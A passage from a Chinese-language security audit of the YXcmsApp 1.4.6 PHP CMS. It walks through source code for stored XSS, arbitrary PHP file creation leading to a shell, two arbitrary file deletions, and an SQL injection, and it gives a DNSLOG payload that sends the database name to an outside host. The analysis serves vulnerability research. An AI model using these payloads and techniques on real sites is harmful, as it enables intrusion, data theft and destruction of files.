                        $cont.= '';
                           break;
                        case 5:
                           $cont.= '';
                        $cont.= '$tableinfo[$i]['tableinfo'])).'" style="width:300px; height:30px;">';
                           break;
                        case 6:
                        $chooses=explode("rn",$tableinfo[$i]['defvalue']);
                        foreach ($chooses as $vo) {
                            $vos=explode(",",$vo);
                            $nowval=array();
                            $nowval=explode(",",$info[$tableinfo[$i]['tableinfo']]);
                            $cont.= (in_array($vos[0],$nowval))?$vos[1].'':$vos[1].'';
                        }
                           break;
                     }
                     $cont.= '';
                  }
                  echo $cont;
只有`case 3`使用了`html_out`函数  
`/protected/include/lib/common.function.php`  
`html_out`
    function html_out($str){
        if(function_exists('htmlspecialchars_decode'))
            $str=htmlspecialchars_decode($str);
        else
            $str=html_entity_decode($str);
        $str = stripslashes($str);
        return $str;
    }
在html代码输出利用`htmlspecialchars_decode`将特殊的 HTML
实体转换回普通字符,那么上面的被实体化的输入代码又被转化回来了，中间那么多的过滤和转换白用了。 而且case3就是留言板那。
## 任意PHP文件添加
新建一个文件
不需要任何权限，可以直接访问`protected/apps/default/view/default/phpinfo.php`
### 源码分析
`protected/apps/admin/controller/setController.php`
    public function tpadd()
        {
           $tpfile=$_GET['Mname'];
           if(empty($tpfile)) $this->error('非法操作~');
           $templepath=BASE_PATH . $this->tpath.$tpfile.'/';
           if($this->isPost()){
             $filename=trim($_POST['filename']);
             $code=stripcslashes($_POST['code']);
             if(empty($filename)||empty($code)) $this->error('文件名和内容不能为空');
             $filepath=$templepath.$filename.'.php';
             if($this->ifillegal($filepath)) {$this->error('非法的文件路径~');exit;}
             try{
                file_put_contents($filepath, $code);
              } catch(Exception $e) {
                $this->error('模板文件创建失败！');
              } 
              $this->success('模板文件创建成功！',url('set/tplist',array('Mname'=>$tpfile)));
           }else{
             $this->tpfile=$tpfile;
             $this->display();
           }
        }
可以看到，我们写入的文件是POST直接传参，而且两个参数均为进行过滤。`$filepath=$templepath.$filename.'.php';`强行指定文件为php文件。
`file_put_contents($filepath, $code);`将没有进行过滤的输入的参数直接写入文件中。  
通过这个漏洞，我们可以直接getshell。
## 任意文件删除一
在上传文件管理中，有个删除文件
我们尝试删除，并且抓包。  
在根目录创建一个`1.txt`  
返回成功，`1.txt`被成功删除
### 源码分析
`protected/apps/admin/controller/filesController.php`
    public function del()
        {
           $dirs=in($_GET['fname']);
           $dirs=str_replace(',','/',$dirs);
           $dirs=ROOT_PATH.'upload'.$dirs;
           if(is_dir($dirs)){del_dir($dirs); echo 1;} 
           elseif(file_exists($dirs)){
             if(unlink($dirs)) echo 1;
           }else echo '文件不存在'; 
        }
使用`in方法`对`$_GET['fname']`进行判断  
`protected\include\lib\common.function.php`
    function in($data,$force=false){
        if(is_string($data)){
            $data=trim(htmlspecialchars($data));//防止被挂马，跨站攻击
            if(($force==true)||(!get_magic_quotes_gpc())) {
               $data = addslashes($data);//防止sql注入
            }
            return  $data;
        } else if(is_array($data)) {
            foreach($data as $key=>$value){
               $data[$key]=in($value,$force);
            }
            return $data;
        } else {
            return $data;
        }   
    }
代码中对传入的数据进行`htmlspecialchars和addslashes`处理，但是并不会对../进行处理  
`del_dir 方法`  
`\YXcmsApp1.4.6\protected\include\lib\common.function.php`
    //遍历删除目录下所有文件
    function del_dir($dir,$ifdeldir=true){
        if (!is_dir($dir)){
            return false;
        }
        $handle = opendir($dir);
        while (($file = readdir($handle)) !== false){
            if ($file != "." && $file != ".."){
                is_dir("$dir/$file")?   del_dir("$dir/$file"):@unlink("$dir/$file");
            }
        }
        if (readdir($handle) == false){
            closedir($handle);
            if($ifdeldir) @rmdir($dir);
        }
        return true;
    }
对文件进行遍历删除操作。
总管这两个方法，对我们输入的参数没有进行任何过滤，`ROOT_PATH.'upload'.$dirs`，拼接文件完整路径，使用`unlink`函数删除文件，参数完全可控，导致任意文件删除。
## 任意文件删除二
抓包 ，通过更改参数`picname` ，达到任意文件删除的目的。  
当返回缩略图不存在时，文件已经被删除。
### 源码分析
`/protected/apps/admin/controller/photoController.php`
    public function delpic()
        {
            if(empty($_POST['picname'])) $this->error('参数错误~');
            $picname=$_POST['picname'];
            $path=$this->uploadpath;
            if(file_exists($path.$picname))
              @unlink($path.$picname);
            else{echo '图片不存在~';return;} 
            if(file_exists($path.'thumb_'.$picname))
               @unlink($path.'thumb_'.$picname);
            else {echo '缩略图不存在~';return;}
            echo '原图以及缩略图删除成功~';
        }
将参数`$_POST['picname']`赋值给`$picname`
，`$this->uploadpath`上传路径赋值到`$path`，把`$path和$picname`连接起来，参数`$picname`完全可控，导致任意文件删除。
## SQL注入
位置：`/index.php?r=admin/fragment/index`
bp抓包 会看到传入两个参数
对`delid`参数进行修改  
`select load_file(concat('\\\\',(select
database()),'.test.dnslog.link\\abc'))`
但是这里没有回显，需要用`DNSLOG`辅助查看回显
这个洞比较鸡肋，因为后台有执行SQL语句的功能
### 源码分析
`\YXcmsApp1.4.6\protected\apps\admin\controller\fragmentController.php`
    public function del()
        {
            if(!$this->isPost()){
                $id=intval($_GET['id']);
                if(empty($id)) $this->error('您没有选择~');
                if(model('fragment')->delete("id='$id'"))
                echo 1;
                else echo '删除失败~';
            }else{
                if(empty($_POST['delid'])) $this->error('您没有选择~');
                $delid=implode(',',$_POST['delid']);
                if(model('fragment')->delete('id in ('.$delid.')'))
                $this->success('删除成功',url('fragment/index'));
            }
        }
对于传入的`delid`变量，首先判断是否存在，然后将逗号和`$_POST['delid']`通过`implode`函数链接在一起。调用`delete`方法继续进行删除。  
查看`delete`方法  
`\YXcmsApp1.4.6\protected\base\model\model.php`
    public function delete($condition){
            return $this->model->table($this->table, $this->ignoreTablePrefix)->where($condition)->delete();
        }
仍有`delete`方法，我们继续查看  
`\YXcmsApp1.4.6\protected\include\core\cpModel.class.php`
    public function delete() {
            $table = $this->options['table'];   //当前表
            $where = $this->_parseCondition();  //条件
            if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除
            $this->sql = "DELETE FROM $table $where";
            $query = $this->db->execute($this->sql);
            return $this->db->affectedRows();
        }
这里依旧是对`$table`和`$where`进行赋值 但是这里使用了`parseCondition()` 查一下  
`\YXcmsApp1.4.6\protected\include\core\db\cpMysql.class.php`
    private function _parseCondition() {
            $condition = $this->db->parseCondition($this->options);
            $this->options['where'] = '';
            $this->options['group'] = '';
            $this->options['having'] = '';
            $this->options['order'] = '';
            $this->options['limit'] = '';
            $this->options['field'] = '*';      
            return $condition;      
        }
这里`$this->db->parseCondition($this->options)`  
查看`parseCondition`方法
    public function parseCondition($options) {
            $condition = "";
            if(!empty($options['where'])) {
                $condition = " WHERE ";
                if(is_string($options['where'])) {
                    $condition .= $options['where'];
                } else if(is_array($options['where'])) {
                        foreach($options['where'] as $key => $value) {
                             $condition .= " `$key` = " . $this->escape($value) . " AND ";
                        }
                        $condition = substr($condition, 0,-4);  
                } else {
                    $condition = "";
                }
            }
            if( !empty($options['group']) && is_string($options['group']) ) {
                $condition .= " GROUP BY " . $options['group'];
            }
            if( !empty($options['having']) && is_string($options['having']) ) {
                $condition .= " HAVING " .  $options['having'];
            }
            if( !empty($options['order']) && is_string($options['order']) ) {
                $condition .= " ORDER BY " .  $options['order'];
            }
            if( !empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit'])) ) {
                $condition .= " LIMIT " .  $options['limit'];
            }
            if( empty($condition) ) return "";
            return $condition;
        }
首先如果传递过来的内容不为空，就给condition赋值 WHERE ，如果是字符串的话，直接进行拼接，如果是数组的话，交由`escape()`方法处理
，之后基本上都是sql语句的关键词赋值，其中出现`escape($value)`，我们查看一下这个函数。
`/protected/include/core/db/cpMysql.class.php`
    public function escape($value) {
            if( isset($this->_readLink) ) {
                $link = $this->_readLink;
            } elseif( isset($this->_writeLink) ) {
                $link = $this->_writeLink;
            } else {
                $link = $this->_getReadLink();
            }
            if( is_array($value) ) { 
               return array_map(array($this, 'escape'), $value);
            } else {
               if( get_magic_quotes_gpc() ) {
                   $value = stripslashes($value);
               } 
                return  "'" . mysql_real_escape_string($value, $link) . "'";
            }
如果传入的是数组，那么回对数组中的每个值进行`mysql_real_escape_string`处理
但是因为只进行了特殊字符的处理，对于数字和字符没有进行处理，所以，存在SQL注入。
# 总结
这次代码审计，只靠我自己是拿不下来的，最后还是参考了P神，p1ump师傅等大牛的博客。即使这样，这个cms
依旧还有一些洞没有复现到位，比如固定会话攻击，和前台xss的getsgell这个两个洞，我一直没有复现出来，所以就没有写到正文中，如果有哪位师傅了解，还请赐教。
# 参考